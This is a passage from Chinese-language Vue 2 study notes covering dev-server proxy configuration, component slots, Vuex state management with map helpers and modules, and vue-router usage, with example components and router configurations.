						console.log('请求失败了',error.message)
					}
				)
			}
		},
	}
</script>

```

vue.config.js 中：

```js
module.exports = {
  pages: {
    index: {
      //入口
      entry: 'src/main.js',
    },
  },
	lintOnSave:false, //关闭语法检查
	//开启代理服务器（方式一）
	/* devServer: {
    proxy: 'http://localhost:5000'
  }, */
	//开启代理服务器（方式二）
	devServer: {
    proxy: {
      '/atguigu': {
        target: 'http://localhost:5000',
				pathRewrite:{'^/atguigu':''},
        // ws: true, //用于支持websocket
        // changeOrigin: true //用于控制请求头中的host值
      },
      '/demo': {
        target: 'http://localhost:5001',
				pathRewrite:{'^/demo':''},
        // ws: true, //用于支持websocket
        // changeOrigin: true //用于控制请求头中的host值  true为欺骗数据服务器代理服务器的端口号（请求来源）
      }
    }
  }
}
```



## 插槽

[插槽](https://v2.cn.vuejs.org/v2/guide/components-slots.html)

1. 作用：让父组件可以向子组件指定位置插入html结构，也是一种组件间通信的方式，适用于 <strong style="color:red">父组件 ===> 子组件</strong> 。

2. 分类：默认插槽、具名插槽、作用域插槽

3. 使用方式：

	1. 默认插槽：

		```vue
		父组件中：
		        <Category>
		           <div>html结构1</div>
		        </Category>
		子组件中：
		        <template>
		            <div>
		               <!-- 定义插槽 -->
		               <slot>插槽默认内容...</slot>
		            </div>
		        </template>
		```

		Category.vue 中：

		```vue
		<template>
			<div class="category">
				<h3>{{title}}分类</h3>
				<!-- 定义一个插槽（挖个坑，等着组件的使用者进行填充） -->
				<slot>我是一些默认值，当使用者没有传递具体结构时，我会出现</slot>
			</div>
		</template>
		
		<script>
			export default {
				name:'Category',
				props:['title']
			}
		</script>
		
		<style scoped>
			.category{
				background-color: skyblue;
				width: 200px;
				height: 300px;
			}
			h3{
				text-align: center;
				background-color: orange;
			}
			video{
				width: 100%;
			}
			img{
				width: 100%;
			}
		</style>
		```

		App.vue中：

		```vue
		<template>
			<div class="container">
				<Category title="美食" >
					<img src="https://s3.ax1x.com/2021/01/16/srJlq0.jpg" alt="">
				</Category>
		
				<Category title="游戏" >
					<ul>
						<li v-for="(g,index) in games" :key="index">{{g}}</li>
					</ul>
				</Category>
		
				<Category title="电影">
					<video controls src="http://clips.vorwaerts-gmbh.de/big_buck_bunny.mp4"></video>
				</Category>
			</div>
		</template>
		
		<script>
			import Category from './components/Category'
			export default {
				name:'App',
				components:{Category},
				data() {
					return {
						foods:['火锅','烧烤','小龙虾','牛排'],
						games:['红色警戒','穿越火线','劲舞团','超级玛丽'],
						films:['《教父》','《拆弹专家》','《你好，李焕英》','《尚硅谷》']
					}
				},
			}
		</script>
		
		<style scoped>
			.container{
				display: flex;
				justify-content: space-around;
			}
		</style>
		
		```

		

	2. 具名插槽：

		```vue
		父组件中：
		        <Category>
		            <template slot="center">
		              <div>html结构1</div>
		            </template>
		
		            <template v-slot:footer>
		               <div>html结构2</div>
		            </template>
		        </Category>
		子组件中：
		        <template>
		            <div>
		               <!-- 定义插槽 -->
		               <slot name="center">插槽默认内容...</slot>
		               <slot name="footer">插槽默认内容...</slot>
		            </div>
		        </template>
		```

		Category.vue中：

		```vue
		<template>
			<div class="category">
				<h3>{{title}}分类</h3>
				<!-- 定义一个插槽（挖个坑，等着组件的使用者进行填充） -->
				<slot name="center">我是一些默认值，当使用者没有传递具体结构时，我会出现1</slot>
				<slot name="footer">我是一些默认值，当使用者没有传递具体结构时，我会出现2</slot>
			</div>
		</template>
		
		<script>
			export default {
				name:'Category',
				props:['title']
			}
		</script>
		
		<style scoped>
			.category{
				background-color: skyblue;
				width: 200px;
				height: 300px;
			}
			h3{
				text-align: center;
				background-color: orange;
			}
			video{
				width: 100%;
			}
			img{
				width: 100%;
			}
		</style>
		```

		App.vue中：

		```vue
		<template>
			<div class="container">
				<Category title="美食" >
					<img slot="center" src="https://s3.ax1x.com/2021/01/16/srJlq0.jpg" alt="">
					<a slot="footer" href="http://www.atguigu.com">更多美食</a>
				</Category>
		
				<Category title="游戏" >
					<ul slot="center">
						<li v-for="(g,index) in games" :key="index">{{g}}</li>
					</ul>
					<div class="foot" slot="footer">
						<a href="http://www.atguigu.com">单机游戏</a>
						<a href="http://www.atguigu.com">网络游戏</a>
					</div>
				</Category>
		
				<Category title="电影">
					<video slot="center" controls src="http://clips.vorwaerts-gmbh.de/big_buck_bunny.mp4"></video>
					<template v-slot:footer>
						<div class="foot">
							<a href="http://www.atguigu.com">经典</a>
							<a href="http://www.atguigu.com">热门</a>
							<a href="http://www.atguigu.com">推荐</a>
						</div>
						<h4>欢迎前来观影</h4>
					</template>
				</Category>
			</div>
		</template>
		
		<script>
			import Category from './components/Category'
			export default {
				name:'App',
				components:{Category},
				data() {
					return {
						foods:['火锅','烧烤','小龙虾','牛排'],
						games:['红色警戒','穿越火线','劲舞团','超级玛丽'],
						films:['《教父》','《拆弹专家》','《你好，李焕英》','《尚硅谷》']
					}
				},
			}
		</script>
		
		<style scoped>
			.container,.foot{
				display: flex;
				justify-content: space-around;
			}
			h4{
				text-align: center;
			}
		</style>
		
		```

		

	3. 作用域插槽：

		1. 理解：<span style="color:red">数据在组件的自身，但根据数据生成的结构需要组件的使用者来决定。</span>（games数据在Category组件中，但使用数据所遍历出来的结构由App组件决定）

		2. 具体编码：

			```vue
			父组件中：
					<Category>
						<template scope="scopeData">
							<!-- 生成的是ul列表 -->
							<ul>
								<li v-for="g in scopeData.games" :key="g">{{g}}</li>
							</ul>
						</template>
					</Category>
			
					<Category>
						<template slot-scope="scopeData">
							<!-- 生成的是h4标题 -->
							<h4 v-for="g in scopeData.games" :key="g">{{g}}</h4>
						</template>
					</Category>
			子组件中：
			        <template>
			            <div>
			                <slot :games="games"></slot>
			            </div>
			        </template>
					
			        <script>
			            export default {
			                name:'Category',
			                props:['title'],
			                //数据在子组件自身
			                data() {
			                    return {
			                        games:['红色警戒','穿越火线','劲舞团','超级玛丽']
			                    }
			                },
			            }
			        </script>
			```

			Category.vue 中：

			```vue
			<template>
				<div class="category">
					<h3>{{title}}分类</h3>
					<slot :games="games" msg="hello">我是默认的一些内容</slot>
				</div>
			</template>
			
			<script>
				export default {
					name:'Category',
					props:['title'],
					data() {
						return {
							games:['红色警戒','穿越火线','劲舞团','超级玛丽'],
						}
					},
				}
			</script>
			
			<style scoped>
				.category{
					background-color: skyblue;
					width: 200px;
					height: 300px;
				}
				h3{
					text-align: center;
					background-color: orange;
				}
				video{
					width: 100%;
				}
				img{
					width: 100%;
				}
			</style>
			```

			App.vue中：

			```vue
			<template>
				<div class="container">
			
					<Category title="游戏">
						<template scope="atguigu">
							<ul>
								<li v-for="(g,index) in atguigu.games" :key="index">{{g}}</li>
							</ul>
						</template>
					</Category>
			
					<Category title="游戏">
						<template scope="{games}">
							<ol>
								<li style="color:red" v-for="(g,index) in games" :key="index">{{g}}</li>
							</ol>
						</template>
					</Category>
			
					<Category title="游戏">
						<template slot-scope="{games}">
							<h4 v-for="(g,index) in games" :key="index">{{g}}</h4>
						</template>
					</Category>
			
				</div>
			</template>
			
			<script>
				import Category from './components/Category'
				export default {
					name:'App',
					components:{Category},
				}
			</script>
			
			<style scoped>
				.container,.foot{
					display: flex;
					justify-content: space-around;
				}
				h4{
					text-align: center;
				}
			</style>
			
			```



# vuex

## 理解 vuex

### vuex是什么？

1. 概念：专门在 Vue 中实现集中式状态（数据）管理的一个 Vue 插件，对 vue 应用中多个组件的共享状态进行集中式的管理（读/写），也是一种组件间通信的方式，且适用于任意组件间通信。

2. Github 地址: https://github.com/vuejs/vuex



### 什么时候使用 vuex？

1. 多个组件依赖于同一状态（数据）

2. 来自不同组件的行为需要变更同一状态（数据）
3. 共享

==比较：==

1. 使用全局事件总线实现组件之间传递数据，较为繁杂

<img src="https://gitee.com/chenfenghx/typora-images/raw/master/%E5%B0%9A%E7%A1%85%E8%B0%B7Vue2.0+Vue3.0%E5%85%A8%E5%A5%97%E6%95%99%E7%A8%8B%E4%B8%A8vuejs%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/202302141957578.png" alt="image-20230214195726378" style="zoom:33%;" />

2. 使用 vuex 管理多个组件都会用到的数据，达到共享的目的

<img src="https://gitee.com/chenfenghx/typora-images/raw/master/%E5%B0%9A%E7%A1%85%E8%B0%B7Vue2.0+Vue3.0%E5%85%A8%E5%A5%97%E6%95%99%E7%A8%8B%E4%B8%A8vuejs%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/202302142000630.png" alt="image-20230214200005473" style="zoom:33%;" />



### Vuex工作原理图

<img src="https://gitee.com/chenfenghx/typora-images/raw/master/%E5%B0%9A%E7%A1%85%E8%B0%B7Vue2.0+Vue3.0%E5%85%A8%E5%A5%97%E6%95%99%E7%A8%8B%E4%B8%A8vuejs%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/202302142140422.png" alt="image-20230214214031235" style="zoom: 40%;" />



<img src="https://gitee.com/chenfenghx/typora-images/raw/master/%E5%B0%9A%E7%A1%85%E8%B0%B7Vue2.0+Vue3.0%E5%85%A8%E5%A5%97%E6%95%99%E7%A8%8B%E4%B8%A8vuejs%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/202302142141318.png" alt="vuex" style="zoom: 33%;" />

<img src="https://gitee.com/chenfenghx/typora-images/raw/master/%E5%B0%9A%E7%A1%85%E8%B0%B7Vue2.0+Vue3.0%E5%85%A8%E5%A5%97%E6%95%99%E7%A8%8B%E4%B8%A8vuejs%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/202302142143982.png" alt="image-20230214214307811" style="zoom:40%;" />

<img src="https://gitee.com/chenfenghx/typora-images/raw/master/%E5%B0%9A%E7%A1%85%E8%B0%B7Vue2.0+Vue3.0%E5%85%A8%E5%A5%97%E6%95%99%E7%A8%8B%E4%B8%A8vuejs%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/202302271121119.png" alt="image-20230227112101971" style="zoom:33%;" />



## 搭建 vuex 工作环境

<img src="https://gitee.com/chenfenghx/typora-images/raw/master/%E5%B0%9A%E7%A1%85%E8%B0%B7Vue2.0+Vue3.0%E5%85%A8%E5%A5%97%E6%95%99%E7%A8%8B%E4%B8%A8vuejs%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/202302142323638.png" alt="image-20230214232328426" style="zoom:45%;" />

1. 安装：npm i vuex@3

2. 脚手架环境下会扫描整个文件的所有 import 语句，并先执行 import 语句，相当于“提升”。

3. 创建文件：```src/store/index.js```

	```js
	//引入Vue核心库
	import Vue from 'vue'
	//引入Vuex
	import Vuex from 'vuex'
	//应用Vuex插件
	Vue.use(Vuex)
	
	//准备actions对象——响应组件中用户的动作
	const actions = {}
	//准备mutations对象——修改state中的数据
	const mutations = {}
	//准备state对象——保存具体的数据
	const state = {}
	
	//创建并暴露store
	export default new Vuex.Store({
		actions,
		mutations,
		state
	})
	```

4. 在```main.js```中创建vm时传入```store```配置项

	```js
	......
	//引入store
	import store from './store'
	......
	
	//创建vm
	new Vue({
		el:'#app',
		render: h => h(App),
		store
	})
	```



##    基本使用

1. 初始化数据、配置```actions```、配置```mutations```，操作文件```store.js```（index.js 如下：）

	```js
	//引入Vue核心库
	import Vue from 'vue'
	//引入Vuex
	import Vuex from 'vuex'
	//引用Vuex
	Vue.use(Vuex)
	
	const actions = {
	    //响应组件中加的动作
		jia(context,value){
			// console.log('actions中的jia被调用了',miniStore,value)
			context.commit('JIA',value)
		},
	}
	
	const mutations = {
	    //执行加
		JIA(state,value){
			// console.log('mutations中的JIA被调用了',state,value)
			state.sum += value
		}
	}
	
	//初始化数据
	const state = {
	   sum:0
	}
	
	//创建并暴露store
	export default new Vuex.Store({
		actions,
		mutations,
		state,
	})
	```

2. 组件中读取vuex中的数据：```$store.state.sum```

3. 组件中修改vuex中的数据：```$store.dispatch('action中的方法名',数据)``` 或 ```$store.commit('mutations中的方法名',数据)```

	>  备注：若没有网络请求或其他业务逻辑，组件中也可以越过actions，即不写```dispatch```，直接编写```commit```

Count.vue 文件中：

```vue
<template>
	<div>
		<h1>当前求和为：{{$store.state.sum}}</h1>
		<select v-model.number="n">
			<option value="1">1</option>
			<option value="2">2</option>
			<option value="3">3</option>
		</select>
		<button @click="increment">+</button>
		<button @click="decrement">-</button>
		<button @click="incrementOdd">当前求和为奇数再加</button>
		<button @click="incrementWait">等一等再加</button>
	</div>
</template>

<script>
	export default {
		name:'Count',
		data() {
			return {
				n:1, //用户选择的数字
			}
		},
		methods: {
			increment(){
				this.$store.commit('JIA',this.n)
			},
			decrement(){
				this.$store.commit('JIAN',this.n)
			},
			incrementOdd(){
				this.$store.dispatch('jiaOdd',this.n)
			},
			incrementWait(){
				this.$store.dispatch('jiaWait',this.n)
			},
		},
		mounted() {
			console.log('Count',this)
		},
	}
</script>

<style lang="css">
	button{
		margin-left: 5px;
	}
</style>

```

（store目录下）index.js 文件如下：

```js
//该文件用于创建Vuex中最为核心的store
import Vue from 'vue'
//引入Vuex
import Vuex from 'vuex'
//应用Vuex插件
Vue.use(Vuex)

//准备actions——用于响应组件中的动作
const actions = {
	/* jia(context,value){
		console.log('actions中的jia被调用了')
		context.commit('JIA',value)
	},
	jian(context,value){
		console.log('actions中的jian被调用了')
		context.commit('JIAN',value)
	}, */
	jiaOdd(context,value){
		console.log('actions中的jiaOdd被调用了')
		if(context.state.sum % 2){
			context.commit('JIA',value)
		}
	},
	jiaWait(context,value){
		console.log('actions中的jiaWait被调用了')
		setTimeout(()=>{
			context.commit('JIA',value)
		},500)
	}
}
//准备mutations——用于操作数据（state）
const mutations = {
	JIA(state,value){
		console.log('mutations中的JIA被调用了')
		state.sum += value
	},
	JIAN(state,value){
		console.log('mutations中的JIAN被调用了')
		state.sum -= value
	}
}
//准备state——用于存储数据
const state = {
	sum:0 //当前的和
}

//创建并暴露store
export default new Vuex.Store({
	actions,
	mutations,
	state,
})
```



## getters 配置项

1. 概念：当state中的数据需要经过加工后再使用时，可以使用getters加工。

2. 在```store.js```中追加```getters```配置

	```js
	......
	
	const getters = {
		bigSum(state){
			return state.sum * 10
		}
	}
	
	//创建并暴露store
	export default new Vuex.Store({
		......
		getters
	})
	```

3. 组件中读取数据：```$store.getters.bigSum```

index.js文件：

```js
//该文件用于创建Vuex中最为核心的store
import Vue from 'vue'
//引入Vuex
import Vuex from 'vuex'
//应用Vuex插件
Vue.use(Vuex)

//准备actions——用于响应组件中的动作
const actions = {
	jiaOdd(context,value){
		console.log('actions中的jiaOdd被调用了')
		if(context.state.sum % 2){
			context.commit('JIA',value)
		}
	},
	jiaWait(context,value){
		console.log('actions中的jiaWait被调用了')
		setTimeout(()=>{
			context.commit('JIA',value)
		},500)
	}
}
//准备mutations——用于操作数据（state）
const mutations = {
	JIA(state,value){
		console.log('mutations中的JIA被调用了')
		state.sum += value
	},
	JIAN(state,value){
		console.log('mutations中的JIAN被调用了')
		state.sum -= value
	}
}
//准备state——用于存储数据，相当于 data
const state = {
	sum:0 //当前的和
}
//准备getters——用于将state中的数据进行加工  相当于 computed
const getters = {
	bigSum(state){
		return state.sum*10
	}
}

//创建并暴露store
export default new Vuex.Store({
	actions,
	mutations,
	state,
	getters
})
```

Count.vue：

```vue
<template>
	<div>
		<h1>当前求和为：{{$store.state.sum}}</h1>
		<h3>当前求和放大10倍为：{{$store.getters.bigSum}}</h3>
		<select v-model.number="n">
			<option value="1">1</option>
			<option value="2">2</option>
			<option value="3">3</option>
		</select>
		<button @click="increment">+</button>
		<button @click="decrement">-</button>
		<button @click="incrementOdd">当前求和为奇数再加</button>
		<button @click="incrementWait">等一等再加</button>
	</div>
</template>

<script>
	export default {
		name:'Count',
		data() {
			return {
				n:1, //用户选择的数字
			}
		},
		methods: {
			increment(){
				this.$store.commit('JIA',this.n)
			},
			decrement(){
				this.$store.commit('JIAN',this.n)
			},
			incrementOdd(){
				this.$store.dispatch('jiaOdd',this.n)
			},
			incrementWait(){
				this.$store.dispatch('jiaWait',this.n)
			},
		},
		mounted() {
			console.log('Count',this.$store)
		},
	}
</script>

<style lang="css">
	button{
		margin-left: 5px;
	}
</style>

```



## 四个map方法的使用

1. <strong>mapState方法：</strong>用于帮助我们映射```state```中的数据为计算属性

	```js
	computed: {
	    //借助mapState生成计算属性：sum、school、subject（对象写法）
	     ...mapState({sum:'sum',school:'school',subject:'subject'}),
	         
	    //借助mapState生成计算属性：sum、school、subject（数组写法）
	    ...mapState(['sum','school','subject']),
	},
	```

2. <strong>mapGetters方法：</strong>用于帮助我们映射```getters```中的数据为计算属性

	```js
	computed: {
	    //借助mapGetters生成计算属性：bigSum（对象写法）
	    ...mapGetters({bigSum:'bigSum'}),
	
	    //借助mapGetters生成计算属性：bigSum（数组写法）
	    ...mapGetters(['bigSum'])
	},
	```

3. <strong>mapActions方法：</strong>用于帮助我们生成与```actions```对话的方法，即：包含```$store.dispatch(xxx)```的函数

	```js
	methods:{
	    //靠mapActions生成：incrementOdd、incrementWait（对象形式）
	    ...mapActions({incrementOdd:'jiaOdd',incrementWait:'jiaWait'})
	
	    //靠mapActions生成：incrementOdd、incrementWait（数组形式）
	    ...mapActions(['jiaOdd','jiaWait'])
	}
	```

4. <strong>mapMutations方法：</strong>用于帮助我们生成与```mutations```对话的方法，即：包含```$store.commit(xxx)```的函数

	```js
	methods:{
	    //靠mapActions生成：increment、decrement（对象形式）
	    ...mapMutations({increment:'JIA',decrement:'JIAN'}),
	    
	    //靠mapMutations生成：JIA、JIAN（对象形式）
	    ...mapMutations(['JIA','JIAN']),
	}
	```

> 备注：
>
> 1. mapActions与mapMutations使用时，==若需要传递参数需要：在模板中绑定事件时传递好参数，否则参数是事件对象。==
> 2. 对象形式：{变量名（本质是字符串）：‘this.$store.xxx’（本质还是字符串，所以要加引号）}，所以不能用对象的简写形式
> 3. 数组形式下 ：key-value的取值是相同的，相当于简写形式

mapState + mapGetters：Count.vue 文件

```vue
//靠程序员自己亲自去写计算属性
/* sum(){
		return this.$store.state.sum
	},
	school(){
		return this.$store.state.school
	},
	subject(){
		return this.$store.state.subject
	}, */

	//借助mapState生成计算属性，从state中读取数据。（对象写法）
	// ...mapState({he:'sum',xuexiao:'school',xueke:'subject'}),

	//借助mapState生成计算属性，从state中读取数据。（数组写法）
	...mapState(['sum','school','subject']),

	/* ******************************************************************** */

	/* bigSum(){
		return this.$store.getters.bigSum
	}, */

	//借助mapGetters生成计算属性，从getters中读取数据。（对象写法）
	// ...mapGetters({bigSum:'bigSum'})

	//借助mapGetters生成计算属性，从getters中读取数据。（数组写法）
	...mapGetters(['bigSum'])
```

mapActions + mapMutations：Count.vue 文件

```vue
		methods: {
			//程序员亲自写方法
			/* increment(){
				this.$store.commit('JIA',this.n)
			},
			decrement(){
				this.$store.commit('JIAN',this.n)
			}, */

			//借助mapMutations生成对应的方法，方法中会调用commit去联系mutations(对象写法)
			...mapMutations({increment:'JIA',decrement:'JIAN'}),

			//借助mapMutations生成对应的方法，方法中会调用commit去联系mutations(数组写法)
			// ...mapMutations(['JIA','JIAN']),

			/* ************************************************* */

			//程序员亲自写方法
			/* incrementOdd(){
				this.$store.dispatch('jiaOdd',this.n)
			},
			incrementWait(){
				this.$store.dispatch('jiaWait',this.n)
			}, */

			//借助mapActions生成对应的方法，方法中会调用dispatch去联系actions(对象写法)
			...mapActions({incrementOdd:'jiaOdd',incrementWait:'jiaWait'})

			//借助mapActions生成对应的方法，方法中会调用dispatch去联系actions(数组写法)
			// ...mapActions(['jiaOdd','jiaWait'])
```



## vuex模块化+命名空间

1. 目的：让代码更好维护，让多种数据分类更加明确。

2. 修改```store.js```

	```javascript
	const countAbout = {
	  namespaced:true,//开启命名空间
	  state:{x:1},
	  mutations: { ... },
	  actions: { ... },
	  getters: {
	    bigSum(state){
	       return state.sum * 10
	    }
	  }
	}
	
	const personAbout = {
	  namespaced:true,//开启命名空间
	  state:{ ... },
	  mutations: { ... },
	  actions: { ... }
	}
	
	const store = new Vuex.Store({
	  modules: {
	    countAbout,
	    personAbout
	  }
	})
	```

3. 开启命名空间后，组件中读取state数据：

	```js
	//方式一：自己直接读取
	this.$store.state.personAbout.list
	//方式二：借助mapState读取：
	...mapState('countAbout',['sum','school','subject']),
	```

4. 开启命名空间后，组件中读取getters数据：

	```js
	//方式一：自己直接读取
	this.$store.getters['personAbout/firstPersonName']
	//方式二：借助mapGetters读取：
	...mapGetters('countAbout',['bigSum'])
	```

5. 开启命名空间后，组件中调用dispatch

	```js
	//方式一：自己直接dispatch
	this.$store.dispatch('personAbout/addPersonWang',person)
	//方式二：借助mapActions：
	...mapActions('countAbout',{incrementOdd:'jiaOdd',incrementWait:'jiaWait'})
	```

6. 开启命名空间后，组件中调用commit

	```js
	//方式一：自己直接commit
	this.$store.commit('personAbout/ADD_PERSON',person)
	//方式二：借助mapMutations：
	...mapMutations('countAbout',{increment:'JIA',decrement:'JIAN'}),
	```



# vue-router

<img src="https://gitee.com/chenfenghx/typora-images/raw/master/%E5%B0%9A%E7%A1%85%E8%B0%B7Vue2.0+Vue3.0%E5%85%A8%E5%A5%97%E6%95%99%E7%A8%8B%E4%B8%A8vuejs%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/202303011343675.png" alt="image-20230301134348334" style="zoom: 50%;" />

<img src="https://gitee.com/chenfenghx/typora-images/raw/master/%E5%B0%9A%E7%A1%85%E8%B0%B7Vue2.0+Vue3.0%E5%85%A8%E5%A5%97%E6%95%99%E7%A8%8B%E4%B8%A8vuejs%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/202303011345889.png" alt="image-20230301134510640" style="zoom:50%;" />



## 路由基本理解

### vue-router 的理解

​       vue 的一个插件库，专门用来实现 SPA 应用

1. 理解： 一个路由（route）就是一组映射关系（key - value），多个路由需要路由器（router）进行管理。
2. 前端路由：key是路径，value是组件。



### 对 SPA 应用的理解

1. 单页 Web 应用（single page web application，SPA）。

2. 整个应用只有**一个完整的页面**。

3. 点击页面中的导航链接**不会刷新**页面，只会做页面的**局部更新。**

4. 数据需要通过 ajax 请求获取。

	

	

### 路由的理解

#### 1. 什么是路由?

1. 一个路由就是一组映射关系（key - value）

2. key 为路径, value 可能是 function 或 component

#### 2. 路由分类

1. 后端路由：

	1) 理解：value 是 function, 用于处理客户端提交的请求。

	2) 工作过程：服务器接收到一个请求时, 根据**请求路径**找到匹配的**函数**来处理请求, 返回响应数据。

2. 前端路由：
	1) 理解：value 是 component，用于展示页面内容。
	2) 工作过程：当浏览器的路径改变时, 对应的组件就会显示。



## 使用基本路由

编写路由的三步骤：定义路由组件、注册路由、使用路由

```
|-- undefined
    |-- App.vue
    |-- main.js
    |-- components
    |   |-- About.vue
    |   |-- Home.vue
    |-- router(放在 src 下面)
        |-- index.js
```



### 1.基本使用

1. 安装vue-router，命令：```npm i vue-router```

2. 应用插件：```Vue.use(VueRouter)```

3. 编写router配置项:

	```js
	//引入VueRouter
	import VueRouter from 'vue-router'
	//引入Luyou 组件
	import About from '../components/About'
	import Home from '../components/Home'
	
	//创建router实例对象，去管理一组一组的路由规则
	const router = new VueRouter({
		routes:[
			{
				path:'/about',
				component:About
			},
			{
				path:'/home',
				component:Home
			}
		]
	})
	
	//暴露router
	export default router
	```

4. 实现切换（active-class可配置高亮样式）

	```vue
	<router-link active-class="active" to="/about">About</router-link>
	```

5. 指定展示位置

	```vue
	<router-view></router-view>
	```

 App.vue 文件：

```vue
<template>
  <div>
    <div class="row">
      <div class="col-xs-offset-2 col-xs-8">
        <div class="page-header"><h2>Vue Router Demo</h2></div>
      </div>
    </div>
    <div class="row">
      <div class="col-xs-2 col-xs-offset-2">
        <div class="list-group">
					<!-- 原始html中我们使用a标签实现页面的跳转 -->
          <!-- <a class="list-group-item active" href="./about.html">About</a> -->
          <!-- <a class="list-group-item" href="./home.html">Home</a> -->

					<!-- Vue中借助router-link标签实现路由的切换 -->
					<router-link class="list-group-item" active-class="active" to="/about">About</router-link>
          <router-link class="list-group-item" active-class="active" to="/home">Home</router-link>
        </div>
      </div>
      <div class="col-xs-6">
        <div class="panel">
          <div class="panel-body">
						<!-- 指定组件的呈现位置 -->
            <router-view></router-view>
          </div>
        </div>
      </div>
    </div>
  </div>
</template>

<script>
	export default {
		name:'App',
	}
</script>

```



### 几个注意点

1. 路由组件通常存放在```pages```文件夹，一般组件通常存放在```components```文件夹。
2. 通过切换，“隐藏”了的路由组件，默认是被销毁掉的，需要的时候再去挂载。
3. 每个组件都有自己的```$route```属性，里面存储着自己的路由信息。
4. 整个应用只有一个router，可以通过组件的```$router```属性获取到。

![image-20230301142539196](https://gitee.com/chenfenghx/typora-images/raw/master/%E5%B0%9A%E7%A1%85%E8%B0%B7Vue2.0+Vue3.0%E5%85%A8%E5%A5%97%E6%95%99%E7%A8%8B%E4%B8%A8vuejs%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/202303011425322.png)



## 嵌套路由（多级路由）

1. 配置路由规则，使用children配置项：

	```js
	routes:[
		{
			path:'/about',
			component:About,
		},
		{
			path:'/home',
			component:Home,
			children:[ //通过children配置子级路由
				{
					path:'news', //此处一定不要写：/news
					component:News
				},
				{
					path:'message',//此处一定不要写：/message
					component:Message
				}
			]
		}
	]
	```

2. 跳转（要写完整路径）：

	```vue
	<router-link to="/home/news">News</router-link>
	```



### 路由的query参数

1. 传递参数

	```vue
	<!-- 跳转并携带query参数，to的字符串写法 -->
	<router-link :to="/home/message/detail?id=666&title=你好">跳转</router-link>
					
	<!-- 跳转并携带query参数，to的对象写法 -->
	<router-link 
		:to="{
			path:'/home/message/detail',
			query:{
			   id:666,
	            title:'你好'
			}
		}"
	>跳转</router-link>
	```

2. 接收参数：

	```js
	$route.query.id
	$route.query.title
	```



### 命名路由

1. 作用：可以简化路由的跳转。

2. 如何使用

	1. 给路由命名：

		```js
		{
			path:'/demo',
			component:Demo,
			children:[
				{
					path:'test',
					component:Test,
					children:[
						{
		                    name:'hello' //给路由命名
							path:'welcome',
							component:Hello,
						}
					]
				}
			]
		}
		```

	2. 简化跳转：

		```vue
		<!--简化前，需要写完整的路径 -->
		<router-link to="/demo/test/welcome">跳转</router-link>
		
		<!--简化后，直接通过名字跳转 -->
		<router-link :to="{name:'hello'}">跳转</router-link>
		
		<!--简化写法配合传递参数 -->
		<router-link 
			:to="{
				name:'hello',
				query:{
				   id:666,
		            title:'你好'
				}
			}"
		>跳转</router-link>
		```



### 路由的params参数

1. 配置路由，声明接收params参数

	```js
	{
		path:'/home',
		component:Home,
		children:[
			{
				path:'news',
				component:News
			},
			{
				component:Message,
				children:[
					{
						name:'xiangqing',
						path:'detail/:id/:title', //使用占位符声明接收params参数
						component:Detail
					}
				]
			}
		]
	}
	```

2. 传递参数

	```vue
	<!-- 跳转并携带params参数，to的字符串写法 -->
	<router-link :to="/home/message/detail/666/你好">跳转</router-link>
					
	<!-- 跳转并携带params参数，to的对象写法 -->
	<router-link 
		:to="{
			name:'xiangqing',  //必须使用 name
			params:{
			   id:666,
	            title:'你好'
			}
		}"
	>跳转</router-link>
	```

	> 特别注意：路由携带params参数时，若使用to的对象写法，则不能使用path配置项，必须使用name配置！

3. 接收参数：

	```js
	$route.params.id
	$route.params.title
	```



### 路由的props配置

作用：让路由组件更方便的收到参数

```js
{
	name:'xiangqing',
	path:'detail/:id',
	component:Detail,

	//第一种写法：props值为对象，该对象中所有的key-value的组合最终都会通过props传给Detail组件
	// props:{a:900}

	//第二种写法：props值为布尔值，布尔值为true，则把路由收到的所有params参数通过props传给Detail组件
	// props:true
	
	//第三种写法：props值为函数，该函数返回的对象中每一组key-value都会通过props传给Detail组件
	props(route){
		return {
			id:route.query.id,
			title:route.query.title
		}
	}
}
```

Detail.vue 组件：

```vue
<template>
	<ul>
		<li>消息编号：{{id}}</li>
		<li>消息标题：{{title}}</li>
	</ul>
</template>

<script>
	export default {
		name:'Detail',
		props:['id','title'],
		computed: {
			// id(){
			// 	return this.$route.query.id
			// },
			// title(){
			// 	return this.$route.query.title
			// },
		},
		mounted() {
			// console.log(this.$route)
		},
	}
</script>
```



### \<router-link>的replace属性

1. 作用：控制路由跳转时操作浏览器历史记录的模式
2. 浏览器的历史记录有两种写入方式：分别为```push```和```replace```，```push```是追加历史记录，```replace```是替换当前记录。路由跳转时候默认为```push```
3. 如何开启```replace```模式：```<router-link replace .......>News</router-link>```



## 编程式路由导航

1. 作用：不借助```<router-link> ```实现路由跳转，让路由跳转更加灵活

2. 具体编码：

	```js
	//$router的两个API
	this.$router.push({
		name:'xiangqing',
			params:{
				id:xxx,
				title:xxx
			}
	})
	
	this.$router.replace({
		name:'xiangqing',
			params:{
				id:xxx,
				title:xxx
			}
	})
	this.$router.forward() //前进
	this.$router.back() //后退
	this.$router.go() //可前进也可后退
	```



相关 API：

|            名称            |                      功能                      |
| :------------------------: | :--------------------------------------------: |
|  this.$router.push(path)   |   相当于点击路由链接(可以返回到当前路由界面)   |
| this.$router.replace(path) | 用新路由替换当前路由(不可以返回到当前路由界面) |
|    this.$router.back()     |            请求(返回)上一个记录路由            |
|    this.$router.go(-1)     |            请求(返回)上一个记录路由            |
|     this.$router.go(1)     |               请求下一个记录路由               |



### 缓存路由组件

1. 作用：让不展示的路由组件保持挂载，不被销毁。

2. 具体编码：

	```vue
	<!-- 缓存多个路由组件 -->
	<!-- <keep-alive :include="['News','Message']"> -->
	
	<!-- 缓存一个路由组件 -->
	<keep-alive include="News">   // 写组件名
	    <router-view></router-view>
	</keep-alive>
	```



